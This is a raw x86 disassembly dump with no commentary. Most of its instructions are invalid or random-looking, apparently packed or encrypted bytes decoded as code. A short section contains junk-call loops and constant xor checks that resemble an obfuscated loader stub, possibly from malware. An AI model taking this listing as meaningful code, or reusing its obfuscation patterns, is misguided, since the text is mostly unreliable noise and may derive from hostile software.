  4174f0:	out    0x41,eax
  4174f2:	lock jmp 0xedc84469
  4174f8:	mov    ds:0xd30c66e7,eax
  4174fd:	cmp    DWORD PTR [edi-0x265db98c],esp
  417503:	jae    0x41749f
  417505:	lahf   
  417506:	xchg   esi,eax
  417507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417508:	out    dx,al
  417509:	test   BYTE PTR [edi-0x70],bl
  41750c:	daa    
  41750d:	jne    0x41753d
  41750f:	mov    BYTE PTR [ecx-0x52],bl
  417512:	mul    DWORD PTR [edx+0x31]
  417515:	outs   dx,DWORD PTR ds:[esi]
  417516:	sub    esp,DWORD PTR [esi]
  417518:	in     al,dx
  417519:	xchg   esi,eax
  41751a:	cmp    DWORD PTR [edx],esi
  41751c:	(bad)  
  41751d:	ret    0xa306
  417520:	sti    
  417521:	sbb    ecx,DWORD PTR [edx]
  417523:	cdq    
  417524:	(bad)  
  417525:	mov    ecx,0x8fafbd
  41752a:	sub    esp,DWORD PTR [ecx+eiz*1]
  41752d:	push   esp
  41752e:	ins    BYTE PTR es:[edi],dx
  41752f:	loop   0x417537
  417531:	add    bl,cl
  417533:	sbb    DWORD PTR ds:0xd616f9f6,esi
  417539:	push   esp
  41753a:	addr16 leave 
  41753c:	fidiv  DWORD PTR [edi-0x5c]
  41753f:	js     0x417593
  417541:	pop    ebp
  417542:	xchg   DWORD PTR [ebp+0x49],edx
  417545:	rol    BYTE PTR [eax-0x23bba933],cl
  41754b:	adc    dl,BYTE PTR [ebx-0x50]
  41754e:	fild   DWORD PTR [esi]
  417550:	sahf   
  417551:	push   edx
  417552:	or     al,BYTE PTR [ecx-0x51]
  417555:	ds retw 
  417558:	sub    eax,0xc46cfd03
  41755d:	popa   
  41755e:	(bad)  
  41755f:	push   0xffffffb8
  417561:	hlt    
  417562:	mov    bl,BYTE PTR [esi+0xd]
  417565:	nop
  417566:	(bad)  
  417567:	retf   0x15bf
  41756a:	sbb    al,0x4c
  41756c:	add    al,0xa1
  41756e:	xchg   DWORD PTR [ebp+eax*1-0x5f],esp
  417572:	dec    edx
  417573:	fidivr DWORD PTR [esi]
  417575:	cdq    
  417576:	mov    esi,0x8d4a07f4
  41757b:	inc    ebx
  41757c:	bound  ebp,QWORD PTR [esi-0x1e]
  41757f:	retf   
  417580:	sbb    DWORD PTR [edx],eax
  417582:	arpl   WORD PTR [eax+eax*8-0x32bed78f],ax
  417589:	fyl2x  
  41758b:	cwde   
  41758c:	jge    0x417539
  41758e:	cmc    
  41758f:	push   ds
  417590:	xchg   esp,eax
  417591:	pop    edx
  417592:	mov    DWORD PTR [edi+0xbfef9a6],ecx
  417598:	sar    DWORD PTR [edi+0x38dd2656],1
  41759e:	es scas al,BYTE PTR es:[edi]
  4175a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a1:	arpl   WORD PTR [ecx+eax*1],si
  4175a4:	rcl    DWORD PTR [edx+0x13bd76f1],cl
  4175aa:	jmp    0x41754a
  4175ac:	add    DWORD PTR [eax],ecx
  4175ae:	push   cs
  4175af:	iret   
  4175b0:	jp     0x4175e7
  4175b2:	ret    0xbd81
  4175b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b6:	cmp    BYTE PTR [eax],0x2c
  4175b9:	or     BYTE PTR [ebp-0x41f82790],ch
  4175bf:	pop    eax
  4175c0:	ins    DWORD PTR es:[edi],dx
  4175c1:	xchg   ebx,eax
  4175c2:	popf   
  4175c3:	out    0x13,eax
  4175c5:	pop    esp
  4175c6:	loop   0x4175a8
  4175c8:	xchg   esi,edi
  4175ca:	nop
  4175cb:	fadd   DWORD PTR [ebp+0x48ebab5f]
  4175d1:	push   edx
  4175d2:	test   BYTE PTR [edx],dl
  4175d4:	sub    al,0x6
  4175d6:	xor    eax,0x3bd1808
  4175db:	(bad)  
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	pop    edx
  4176bb:	add    al,0x10
  4176bd:	mov    ?,WORD PTR [edi+0x2d]
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0x9878787e
  4176c7:	xor    DWORD PTR [ebp-0x117838f0],edi
  4176cd:	mov    cl,0x15
  4176cf:	dec    eax
  4176d0:	sahf   
  4176d1:	imul   esi,edx,0xfd885328
  4176d7:	add    DWORD PTR [ebx+ebx*1-0x32d916e0],ebp
  4176de:	repnz repz pop ebx
  4176e1:	mov    ?,WORD PTR [ecx]
  4176e3:	mov    ds:0xbc6848cb,al
  4176e8:	icebp  
  4176e9:	out    0xe6,al
  4176eb:	mov    esp,0x88983194
  4176f0:	popf   
  4176f1:	push   edi
  4176f2:	mov    ebx,0xd5684742
  4176f7:	mov    dh,0xe0
  4176f9:	jbe    0x4176d5
  4176fb:	jg     0x417685
  4176fd:	mov    bh,0x10
  4176ff:	xchg   ebp,eax
  417700:	imul   edi,DWORD PTR [edx],0x19
  417703:	pop    esi
  417704:	(bad)  
  417705:	(bad)
  417708:	or     edx,eax
  41770a:	ins    BYTE PTR es:[edi],dx
  41770b:	jecxz  0x4176bd
  41770d:	jb     0x4176a2
  41770f:	sub    BYTE PTR [ebx],bl
  417711:	xchg   esp,eax
  417712:	sbb    cl,BYTE PTR [edi+0x1]
  417715:	add    DWORD PTR [esi],ebp
  417717:	inc    eax
  417718:	cs scas eax,DWORD PTR es:[edi]
  41771a:	or     esi,DWORD PTR [edi+0x3b]
  41771d:	stos   DWORD PTR es:[edi],eax
  41771e:	cmp    eax,0x5c284c73
  417723:	mov    dl,cl
  417725:	xor    dh,BYTE PTR [ebp-0x33627eb0]
  41772b:	jnp    0x417727
  41772d:	and    edi,DWORD PTR [esi-0x7f]
  417730:	mov    al,ds:0xeb914e4e
  417735:	mov    edx,0x86883072
  41773a:	leave  
  41773b:	(bad)  
  41773c:	xlat   BYTE PTR ds:[ebx]
  41773d:	adc    ch,BYTE PTR [esi-0xa09812d]
  417743:	shl    DWORD PTR [ecx],cl
  417745:	jae    0x417710
  417747:	pop    ebp
  417748:	pop    ebp
  417749:	or     BYTE PTR [edi+0x4edc7bf5],dl
  41774f:	xor    BYTE PTR [ebx+0x12],dh
  417752:	mov    bl,0x7e
  417754:	mul    BYTE PTR [eax]
  417756:	lock popa 
  417758:	inc    esp
  417759:	out    0xcf,eax
  41775b:	or     eax,0x9f479f35
  417760:	dec    ebp
  417761:	(bad)  
  417762:	neg    BYTE PTR [eax-0x7a4e237e]
  417768:	inc    esp
  417769:	xchg   esi,eax
  41776a:	adc    bl,bl
  41776c:	gs inc eax
  41776e:	mov    bh,0x8b
  417770:	cld    
  417771:	mov    dl,0x8
  417773:	iret   
  417774:	push   ebx
  417776:	js     0x417731
  417778:	push   edx
  417779:	push   ss
  41777a:	popf   
  41777b:	dec    esp
  41777c:	mov    esi,edi
  41777e:	push   0x26
  417780:	jae    0x417726
  417782:	and    BYTE PTR [esi-0x19d31e46],dl
  417788:	sahf   
  417789:	loope  0x4177f1
  41778b:	sub    edi,ebx
  41778d:	test   eax,edi
  41778f:	xor    DWORD PTR [ecx-0x69b87cfe],0xeee6ad36
  417799:	out    0xef,eax
  41779b:	aam    0x1f
  41779d:	ss push ss
  41779f:	imul   ebx,DWORD PTR ds:0x46349fca,0x5c
  4177a6:	adc    al,0xf4
  4177a8:	dec    edx
  4177a9:	cmp    al,BYTE PTR cs:0xb100d794
  4177b0:	add    edx,DWORD PTR ds:0xddff7f66
  4177b6:	jne    0x41775e
  4177b8:	popa   
  4177b9:	pop    ss
  4177ba:	push   ebx
  4177bc:	dec    ecx
  4177bd:	sub    BYTE PTR [esp+ebx*2+0x5d],cl
  4177c1:	add    ecx,0x2a9d6b86
  4177c7:	cld    
  4177c8:	es push esi
  4177ca:	repnz dec ecx
  4177cc:	jne    0x417782
  4177ce:	pop    ds
  4177cf:	retf   
  4177d0:	test   cl,al
  4177d2:	sub    edi,DWORD PTR [edi-0x7f]
  4177d5:	retf   0x11a0
  4177d8:	mov    al,ds:0x2d1bb11e
  4177dd:	mov    BYTE PTR [ecx-0x6268e9b3],cl
  4177e3:	es sahf 
  4177e5:	(bad)  
  4177e7:	retf   0x1ad
  4177ea:	mov    eax,0x980a095c
  4177ef:	(bad)  
  4177f0:	push   ecx
  4177f1:	dec    esp
  4177f2:	dec    eax
  4177f3:	in     eax,dx
  4177f4:	mov    edi,0x8c357565
  4177f9:	push   ss
  4177fa:	popa   
  4177fb:	leave  
  4177fc:	nop
  4177fd:	mov    eax,ds:0x362d299c
  417802:	mov    bl,0x1c
  417804:	(bad)  
  417805:	stc    
  417806:	dec    ebp
  417807:	hlt    
  417808:	or     BYTE PTR [ebx],0xc1
  41780b:	addr16 and eax,0x8eed0103
  417811:	cwde   
  417812:	adc    DWORD PTR [eax+eax*8-0x3f],esp
  417816:	pushf  
  417817:	idiv   eax
  417819:	in     al,dx
  41781a:	sbb    edx,eax
  41781c:	out    0x1e,al
  41781e:	xchg   edx,eax
  41781f:	pop    ebx
  417820:	or     dh,al
  417822:	(bad)  
  417824:	xchg   edx,eax
  417825:	sbb    BYTE PTR [edx],ch
  417827:	mov    ebx,0x4d041afb
  41782c:	(bad)
  41782f:	sub    ebp,DWORD PTR ds:0x2ff7
  417834:	jecxz  0x41783c
  417836:	jl     0x417860
  417838:	add    dh,BYTE PTR [ecx]
  41783a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41783b:	into   
  41783c:	dec    esp
  41783d:	pushf  
  41783e:	aad    0x66
  417840:	das    
  417841:	xchg   esp,eax
  417842:	stc    
  417843:	lds    esi,FWORD PTR [ebp+0x5f]
  417846:	rcr    DWORD PTR [eax+0x4],1
  417849:	xchg   ebx,eax
  41784a:	pusha  
  41784b:	add    ch,BYTE PTR [ecx-0x18e788ab]
  417851:	hlt    
  417852:	mov    ch,0x11
  417854:	inc    ecx
  417855:	dec    edi
  417856:	stos   DWORD PTR es:[edi],eax
  417857:	mov    edx,0xce00b863
  41785c:	(bad)  
  41785d:	mov    eax,0x43a253cb
  417862:	xor    ch,bl
  417864:	fidivr DWORD PTR ds:0x65ff298b
  41786a:	mov    cl,0xd4
  41786c:	retf   0xd4ca
  41786f:	pop    ebx
  417870:	mov    ds:0xadfdfafb,eax
  417875:	repnz fdivr DWORD PTR [edx+0x15a13b88]
  41787c:	mov    ds:0xb494c605,eax
  417881:	daa    
  417882:	bound  ecx,QWORD PTR [edx+edi*8+0x5e]
  417886:	inc    eax
  417887:	inc    ebx
  417888:	pop    ecx
  417889:	repz push ds
  41788b:	mov    edi,0xd9632b68
  417890:	rcl    BYTE PTR [eax-0x49cd1659],cl
  417896:	push   ebx
  417897:	sahf   
  417898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417899:	jle    0x4178d7
  41789b:	hlt    
  41789c:	xor    al,0xa3
  41789e:	mov    cl,0x47
  4178a0:	cmp    edi,DWORD PTR [ebp-0x5905d944]
  4178a6:	mov    ?,WORD PTR [ebx+esi*8-0x5ec0b47d]
  4178ad:	in     al,0x25
  4178af:	push   es
  4178b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b1:	inc    esi
  4178b2:	sbb    DWORD PTR [ebx+0x6d804cb8],esi
  4178b8:	sbb    eax,0xa32f9b1e
  4178bd:	add    al,BYTE PTR [ecx+ebx*2+0x7]
  4178c1:	cmp    BYTE PTR [ebp-0x29a6467a],al
  4178c7:	sbb    cl,cl
  4178c9:	(bad)  [ebp+0x2138829b]
  4178cf:	inc    eax
  4178d0:	xor    BYTE PTR [ebx],al
  4178d2:	dec    eax
  4178d3:	cmp    al,0xe9
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	add    BYTE PTR [ebp+0x3304d7ad],0x7f
  4178ec:	js     0x4178f3
  4178ee:	jle    0x417968
  4178f0:	js     0x417873
  4178f2:	mov    bh,0x72
  4178f4:	mov    al,ds:0xfd53288
  4178f9:	jnp    0x41787c
  4178fb:	sbb    BYTE PTR [esi-0x67],dl
  4178fe:	ret    
  4178ff:	sahf   
  417900:	gs inc ecx
  417902:	inc    eax
  417903:	ja     0x417954
  417905:	and    BYTE PTR [edi-0x32],0xd6
  417909:	add    DWORD PTR [edx-0x71],ebx
  41790c:	mov    dh,0xa4
  41790e:	pop    ebp
  41790f:	pop    ds
  417910:	pop    es
  417911:	(bad)  
  417912:	pushf  
  417913:	sbb    esp,DWORD PTR [edi+0x47]
  417916:	(bad)  
  417917:	call   0xdbae:0xfafe3229
  41791e:	call   0xa60cb6a0
  417923:	imul   edi,ebx,0xe0e6ef2a
  417929:	xchg   esi,eax
  41792a:	es pop ebp
  41792c:	mov    al,ds:0x85fe4b81
  417931:	in     eax,dx
  417932:	adc    BYTE PTR [ecx],dh
  417934:	xchg   edx,eax
  417935:	pop    esi
  417936:	aam    0x34
  417938:	jecxz  0x4178f4
  41793a:	leave  
  41793b:	lahf   
  41793c:	xor    al,0xd9
  41793e:	ret    0xe7d4
  417941:	adc    eax,0xa8897e58
  417946:	or     al,0xb1
  417948:	hlt    
  417949:	mov    eax,ds:0xa6fdcabc
  41794e:	mov    al,0x19
  417950:	push   ebp
  417951:	std    
  417952:	push   esp
  417953:	rcl    DWORD PTR [eax+0x2b16d0f7],1
  417959:	imul   BYTE PTR [eax+0x5f7c88c2]
  41795f:	mov    ds:0xfc8cec4,eax
  417964:	mov    esp,0x968ce943
  417969:	pop    ebx
  41796a:	sbb    ecx,DWORD PTR [edx]
  41796c:	pop    esi
  41796d:	(bad)  
  41796f:	xlat   BYTE PTR ds:[ebx]
  417970:	jmp    0x4179d9
  417972:	inc    ebp
  417973:	lds    edx,FWORD PTR [ecx+0x50]
  417976:	jne    0x4179a0
  417978:	retf   
  417979:	imul   ebx,edx,0xffffff80
  41797c:	sbb    DWORD PTR [ebx+0x21],ebp
  41797f:	stos   BYTE PTR es:[edi],al
  417980:	push   0x6
  417982:	fisttp QWORD PTR [esp+eax*1-0x25e5ae8]
  417989:	jae    0x4179d4
  41798b:	sub    DWORD PTR ds:0x58116064,0x4ee06d21
  417995:	sub    dl,bl
  417997:	lahf   
  417998:	cdq    
  417999:	call   0xb48a:0xb10535a4
  4179a0:	jle    0x4179d2
  4179a2:	lods   al,BYTE PTR ds:[esi]
  4179a3:	cwde   
  4179a4:	aaa    
  4179a5:	cmp    al,0xe6
  4179a7:	in     ax,dx
  4179a9:	int    0x8c
  4179ab:	call   0x6ee7:0xaeb7613c
  4179b2:	fisttp QWORD PTR [ebp+0x1e96da62]
  4179b8:	push   edx
  4179b9:	in     al,0x1a
  4179bb:	(bad)  
  4179bc:	adc    al,0x5a
  4179be:	adc    edx,DWORD PTR ds:0x2bd5ddce
  4179c4:	jbe    0x4179c6
  4179c6:	fs stos DWORD PTR es:[edi],eax
  4179c8:	and    eax,0xc37f1a51
  4179cd:	das    
  4179ce:	jp     0x4179ae
  4179d0:	fldenv [edi]
  4179d2:	cdq    
  4179d3:	jl     0x417a4a
  4179d5:	mov    al,0xc
  4179d7:	shl    DWORD PTR ds:[ecx-0x16e2c2a7],1
  4179de:	push   ebx
  4179df:	xlat   BYTE PTR ds:[ebx]
  4179e0:	leave  
  4179e1:	pop    ebp
  4179e2:	mov    al,ds:0xd06c0e8d
  4179e7:	dec    ecx
  4179e8:	sbb    eax,0xc5844425
  4179ed:	inc    ebx
  4179ee:	sub    eax,0xba192ce3
  4179f3:	xor    al,0x4c
  4179f5:	stos   BYTE PTR es:[edi],al
  4179f6:	test   DWORD PTR [eax],edi
  4179f8:	iret   
  4179f9:	and    ch,BYTE PTR [ebx+0x6a878aaa]
  4179ff:	pop    eax
  417a00:	pop    ebp
  417a01:	call   DWORD PTR [eax]
  417a03:	cmp    esp,DWORD PTR [edx+0x5c]
  417a06:	scas   al,BYTE PTR es:[edi]
  417a07:	or     ebx,DWORD PTR [edi-0x23]
  417a0a:	ret    
  417a0b:	mov    eax,ds:0x986f1361
  417a10:	add    DWORD PTR [ecx],edi
  417a12:	repz fcomp DWORD PTR [ebp-0x24b735ac]
  417a19:	add    BYTE PTR [esi-0x5b],bh
  417a1c:	(bad)  
  417a1d:	pop    eax
  417a1e:	nop
  417a1f:	fstp   TBYTE PTR [ebx-0x49]
  417a22:	xor    edx,DWORD PTR [edi-0x785e580c]
  417a28:	pop    ebx
  417a29:	aaa    
  417a2a:	jns    0x417a85
  417a2c:	fdivp  st(2),st
  417a2e:	loop   0x417aa8
  417a30:	arpl   WORD PTR [edi-0x1e],bx
  417a33:	pop    esi
  417a34:	hlt    
  417a35:	or     al,0xa
  417a37:	and    eax,0x9e701c69
  417a3c:	(bad)  
  417a3d:	fsubp  st(7),st
  417a3f:	inc    ebp
  417a40:	or     al,0x32
  417a42:	push   esi
  417a43:	loop   0x417a70
  417a45:	mov    esp,0x148ffcc7
  417a4a:	out    0xac,eax
  417a4c:	out    dx,eax
  417a4d:	retf   0x8cdf
  417a50:	xchg   DWORD PTR [edi],ecx
  417a52:	enter  0x96d,0xe0
  417a56:	fwait
  417a57:	pop    ebx
  417a58:	push   edx
  417a59:	(bad)  
  417a5a:	xor    al,0xe
  417a5c:	push   eax
  417a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a5e:	push   esi
  417a5f:	cli    
  417a60:	fmul   DWORD PTR ss:[edi+0x7f]
  417a64:	adc    al,0x4d
  417a66:	mov    esp,DWORD PTR [ebx]
  417a68:	mov    DWORD PTR [edi+0x75],ebx
  417a6b:	push   edx
  417a6c:	int3   
  417a6d:	sahf   
  417a6e:	push   edx
  417a6f:	mov    dl,0x15
  417a71:	fnstenv [edx-0x60f41788]
  417a77:	mov    esi,0xe60916e1
  417a7c:	lods   eax,DWORD PTR ds:[esi]
  417a7d:	stos   BYTE PTR es:[edi],al
  417a7e:	lods   al,BYTE PTR ds:[esi]
  417a7f:	test   eax,0x5de5bfb4
  417a84:	mov    ebx,DWORD PTR [eax]
  417a86:	pop    ss
  417a87:	mov    ah,0xa1
  417a89:	sbb    al,0x14
  417a8b:	xchg   edi,eax
  417a8c:	jmp    0x59a514bb
  417a91:	jge    0x417a78
  417a93:	popa   
  417a94:	sahf   
  417a95:	adc    BYTE PTR [eax-0x5d],ah
  417a98:	jo     0x417a68
  417a9a:	xor    edx,ebp
  417a9c:	mov    eax,ds:0x3e61b404
  417aa1:	mov    WORD PTR [ebx-0x874c8dd],?
  417aa7:	mov    al,ds:0xfdd8f3cd
  417aac:	xor    eax,0x20f9e42c
  417ab1:	xchg   ebp,eax
  417ab2:	push   0xffffffe7
  417ab4:	sbb    ah,dh
  417ab6:	(bad)  
  417ab7:	(bad)  
  417ab8:	push   edx
  417ab9:	mov    cs,WORD PTR [esi+0x23]
  417abc:	rcl    edi,1
  417abe:	inc    esi
  417abf:	cmp    edi,ebp
  417ac1:	stos   DWORD PTR es:[edi],eax
  417ac2:	pop    ebp
  417ac3:	mov    ecx,0xd16c158e
  417ac8:	aaa    
  417ac9:	xchg   BYTE PTR [edx+0x96e9192],dl
  417acf:	lods   al,BYTE PTR ds:[esi]
  417ad0:	leave  
  417ad1:	mov    edi,0xc8a4e31e
  417ad6:	inc    edi
  417ad7:	push   ecx
  417ad8:	popf   
  417ad9:	dec    ebp
  417ada:	xor    ecx,esp
  417adc:	inc    ebx
  417add:	jbe    0x417aa7
  417adf:	sub    edx,edi
  417ae1:	mov    al,0xd9
  417ae3:	mov    dh,0xa0
  417ae5:	std    
  417ae6:	cmp    BYTE PTR [eax-0x6d],bh
  417ae9:	out    dx,eax
  417aea:	imul   ebp,DWORD PTR [edx-0x71a4c91],0x44197cb0
  417af4:	mov    eax,ds:0x4ddf5394
  417af9:	(bad)  
  417afa:	sub    al,0x67
  417afc:	mov    edx,0x7510850
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xb28cec6c
  417b49:	enter  0x3111,0x7f
  417b4d:	js     0x417b54
  417b4f:	jle    0x417bc9
  417b51:	js     0x417bb0
  417b53:	adc    BYTE PTR [ecx],bl
  417b55:	xor    ebx,0xffffff87
  417b58:	jne    0x417b1e
  417b5a:	std    
  417b5b:	or     al,0xc9
  417b5d:	or     BYTE PTR [edi],dh
  417b5f:	adc    eax,0xdf7017d7
  417b64:	std    
  417b65:	loope  0x417b84
  417b67:	sub    BYTE PTR [ecx-0xb025167],bl
  417b6d:	jae    0x417baf
  417b6f:	fwait
  417b70:	or     ch,cl
  417b72:	neg    bl
  417b74:	and    ch,BYTE PTR [eax+0x4]
  417b77:	push   ss
  417b78:	ja     0x417bf1
  417b7a:	dec    ebp
  417b7b:	lods   eax,DWORD PTR ds:[esi]
  417b7c:	adc    BYTE PTR [edx+0x6c],bl
  417b7f:	test   BYTE PTR [esi-0x7fb02543],al
  417b85:	and    bl,al
  417b87:	stos   DWORD PTR es:[edi],eax
  417b88:	lea    eax,[ebx-0x6c5e6e2b]
  417b8e:	idiv   BYTE PTR [ecx]
  417b90:	fnstsw WORD PTR gs:[esi-0x76]
  417b94:	out    0x6e,al
  417b96:	pop    esi
  417b97:	out    dx,eax
  417b98:	cmp    eax,DWORD PTR [edx]
  417b9a:	pushf  
  417b9b:	out    dx,eax
  417b9c:	cmp    ebx,ebx
  417b9e:	fwait
  417b9f:	das    
  417ba0:	xchg   esp,eax
  417ba1:	enter  0x249f,0xf3
  417ba5:	xor    dl,ch
  417ba7:	iret   
  417ba8:	mov    es,ebx
  417baa:	xchg   ecx,eax
  417bab:	loop   0x417c17
  417bad:	xchg   DWORD PTR [ecx],ebx
  417baf:	shl    DWORD PTR [eax+0x33c552c3],0x35
  417bb6:	dec    esp
  417bb7:	or     BYTE PTR [eax+ebx*2-0x34c7a1fb],cl
  417bbe:	mov    ecx,0x3904daf2
  417bc3:	sub    esp,edx
  417bc5:	stos   BYTE PTR es:[edi],al
  417bc6:	cwde   
  417bc7:	sub    BYTE PTR [eax],cl
  417bc9:	push   edi
  417bca:	mov    eax,0xe7f9febe
  417bcf:	test   al,dh
  417bd1:	(bad)  
  417bd2:	sub    al,0x35
  417bd4:	pop    es
  417bd5:	add    DWORD PTR [esi+0xf3a571c],edx
  417bdb:	xchg   BYTE PTR es:[edx+0x12],bh
  417bdf:	jge    0x417c18
  417be1:	retf   
  417be2:	sbb    al,0x3d
  417be4:	int    0x68
  417be6:	js     0x417c28
  417be8:	fwait
  417be9:	mov    WORD PTR [edx-0x4cc7865d],cs
  417bef:	scas   al,BYTE PTR es:[edi]
  417bf0:	sti    
  417bf1:	push   0x66
  417bf3:	push   esp
  417bf4:	sub    esi,DWORD PTR [edi-0x28]
  417bf7:	jne    0x417c1a
  417bf9:	rol    DWORD PTR [ecx],cl
  417bfb:	mov    ebx,eax
  417bfd:	in     eax,dx
  417bfe:	imul   edx,edi,0xffffffd0
  417c01:	gs enter 0x557,0xdd
  417c06:	add    ebx,DWORD PTR [edx-0x24]
  417c09:	sub    cl,BYTE PTR [eax]
  417c0b:	cld    
  417c0c:	xchg   eax,ebx
  417c0e:	mov    al,0xa7
  417c10:	test   al,bh
  417c12:	cmp    al,0xc8
  417c14:	mov    edi,0x7dd4527d
  417c19:	(bad)  
  417c1a:	imul   eax,DWORD PTR [ebx+ecx*2+0x32e33eed],0xffffffeb
  417c22:	pop    ebx
  417c23:	(bad)  
  417c24:	pop    esi
  417c25:	leave  
  417c26:	inc    edx
  417c27:	leave  
  417c28:	ss jmp 0x4f6a:0x42dff559
  417c30:	xchg   esp,eax
  417c31:	in     al,dx
  417c32:	(bad)  
  417c33:	idiv   BYTE PTR [eax-0x5fca09b1]
  417c39:	adc    al,0xa0
  417c3b:	xor    al,0x27
  417c3d:	(bad)  
  417c3e:	mov    dh,0x60
  417c40:	sub    BYTE PTR [ecx+0xa716e4a],dl
  417c46:	test   BYTE PTR [ebx],cl
  417c48:	imul   esi,DWORD PTR [eax+0x60],0x770652bf
  417c4f:	dec    ecx
  417c50:	mov    ds,WORD PTR [eax+0x41fa0d95]
  417c56:	xchg   BYTE PTR [edx],ah
  417c58:	dec    edx
  417c59:	ficom  DWORD PTR ds:0x2a76d39d
  417c5f:	mov    ebp,0x633c6e3b
  417c64:	(bad)  
  417c65:	xlat   BYTE PTR ds:[ebx]
  417c66:	jo     0x417cab
  417c68:	mov    ebx,esi
  417c6a:	rol    ebx,cl
  417c6c:	sbb    al,0xc5
  417c6e:	(bad)
  417c71:	call   0x80dd:0x744502d
  417c78:	rcl    BYTE PTR [ebp+0x1c],0x72
  417c7c:	pop    edi
  417c7d:	dec    edi
  417c7e:	xlat   BYTE PTR ds:[ebx]
  417c7f:	or     BYTE PTR [edx],al
  417c81:	movntps XMMWORD PTR [ebx+0x7f6c75e8],xmm4
  417c88:	(bad)  
  417c89:	xor    ecx,DWORD PTR [edi+0x2f]
  417c8c:	fwait
  417c8d:	gs cld 
  417c8f:	pop    ecx
  417c90:	popf   
  417c91:	das    
  417c92:	xchg   edi,eax
  417c93:	add    eax,0x4c097fbb
  417c98:	or     DWORD PTR [ebp-0x69],edi
  417c9b:	and    BYTE PTR [edx+0x4],0xec
  417c9f:	int3   
  417ca0:	or     BYTE PTR [ecx+0x6f89e147],0x7c
  417ca7:	xor    dh,BYTE PTR [edi-0x5f]
  417caa:	and    ecx,DWORD PTR [eax]
  417cac:	and    eax,0xe9de050f
  417cb1:	adc    al,0xb9
  417cb3:	jg     0x417caf
  417cb5:	and    ch,0xb2
  417cb8:	mov    eax,ds:0x19a4441a
  417cbd:	jmp    0xe9b4caf4
  417cc2:	pop    edx
  417cc3:	or     ah,BYTE PTR [eax+0x42]
  417cc6:	popa   
  417cc7:	aad    0x11
  417cc9:	int3   
  417cca:	dec    eax
  417ccb:	stos   BYTE PTR es:[edi],al
  417ccc:	jl     0x417cc8
  417cce:	imul   ebp,DWORD PTR [ebx+ebp*4+0x41],0x32
  417cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cd4:	outs   dx,DWORD PTR ds:[esi]
  417cd5:	mov    ds,WORD PTR [eax]
  417cd7:	ins    BYTE PTR es:[edi],dx
  417cd8:	mov    bl,0x4a
  417cda:	retf   0xff71
  417cdd:	fstp   QWORD PTR [edx+0xe]
  417ce0:	pop    ebx
  417ce1:	add    BYTE PTR [eax+edi*4],ch
  417ce4:	push   ebp
  417ce5:	xor    eax,0x7a626dc7
  417cea:	rcr    esp,1
  417cec:	repz xor ch,0x23
  417cf0:	fwait
  417cf1:	xchg   edx,eax
  417cf2:	and    ebp,esp
  417cf4:	pop    edi
  417cf5:	mov    al,0xcb
  417cf7:	ja     0x417ca1
  417cf9:	push   cs
  417cfa:	icebp  
  417cfb:	sbb    bl,BYTE PTR [ebp+0x4226eb11]
  417d01:	push   edx
  417d02:	jp     0x417cc6
  417d04:	mov    eax,ds:0xfcc7c78d
